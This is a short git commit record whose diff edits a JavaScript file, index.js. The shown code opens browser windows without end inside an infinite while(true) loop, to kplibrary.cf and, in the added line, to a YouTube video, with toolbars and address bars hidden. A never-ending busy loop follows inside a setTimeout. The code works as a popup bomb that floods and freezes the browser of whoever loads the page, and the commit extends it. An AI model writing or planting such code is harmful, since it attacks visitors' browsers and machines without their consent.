53a0154a3f69cb5a9a1e4a3e981bb018771a4d52
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 14:57:31 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,7 @@
 
 while(true)
 {
+window.open('https://www.youtube.com/watch?v=aRsWk4JZa5k', '_blank', 'toolbar=0,location=0,menubar=0');
 window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
 setTimeout(function(){
 for(var i = 0; i === i; i++) {}
